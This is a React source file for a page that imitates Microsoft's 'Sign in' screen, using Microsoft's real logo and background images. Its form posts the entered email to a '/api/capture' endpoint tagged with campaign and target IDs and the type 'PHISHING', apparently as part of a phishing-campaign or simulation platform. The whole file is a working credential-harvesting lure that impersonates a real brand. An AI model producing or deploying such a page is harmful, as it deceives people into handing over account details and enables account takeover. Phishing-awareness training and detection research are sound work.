'use client';

import React, { useState } from 'react';

export default function MicrosoftLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  return (
    <div style={{ fontFamily: '"Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: '#f2f2f2' }}>
      
      {/* Background image mockup */}
      <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'url(https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg) center center / cover no-repeat', zIndex: 0 }}></div>

      <div style={{ position: 'relative', zIndex: 1, backgroundColor: '#fff', width: '100%', maxWidth: '440px', padding: '44px', boxSizing: 'border-box', boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" style={{ height: '24px', marginBottom: '24px' }} />
        
        <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b', margin: '0 0 16px' }}>Sign in</h1>
        
        <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
          <input type="hidden" name="campaignId" value={campaignId} />
          <input type="hidden" name="targetId" value={targetId} />
          <input type="hidden" name="type" value="PHISHING" />

          <input 
            type="email" 
            name="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email, phone, or Skype"
            required
            style={{
              padding: '6px 0',
              border: 'none',
              borderBottom: '1px solid #666',
              fontSize: '15px',
              marginBottom: '16px',
              outline: 'none',
              color: '#1b1b1b'
            }}
          />
          
          <div style={{ fontSize: '13px', marginBottom: '16px' }}>
            No account? <a href="#" style={{ color: '#0067b8', textDecoration: 'none' }}>Create one!</a>
          </div>

          <div style={{ fontSize: '13px', marginBottom: '32px' }}>
            <a href="#" style={{ color: '#0067b8', textDecoration: 'none' }}>Can't access your account?</a>
          </div>

          <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '16px' }}>
            <button 
              type="submit"
              style={{
                backgroundColor: '#0067b8',
                color: '#fff',
                border: 'none',
                padding: '4px 32px',
                minHeight: '32px',
                fontSize: '15px',
                cursor: 'pointer'
              }}
            >
              Next
            </button>
          </div>
        </form>
      </div>

      <div style={{ position: 'relative', zIndex: 1, backgroundColor: '#fff', width: '100%', maxWidth: '440px', padding: '12px 44px', boxSizing: 'border-box', border: '1px solid #ccc', marginTop: '24px', boxShadow: '0 2px 6px rgba(0,0,0,0.2)', display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" style={{ height: '32px', marginRight: '16px' }} />
        <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Sign-in options</span>
      </div>

      <div style={{ position: 'absolute', bottom: '0', width: '100%', padding: '10px 20px', display: 'flex', justifyContent: 'flex-end', gap: '20px', fontSize: '12px', zIndex: 1 }}>
        <a href="#" style={{ color: '#000', textDecoration: 'none' }}>Terms of use</a>
        <a href="#" style={{ color: '#000', textDecoration: 'none' }}>Privacy & cookies</a>
        <a href="#" style={{ color: '#000', textDecoration: 'none' }}>...</a>
      </div>
    </div>
  );
}
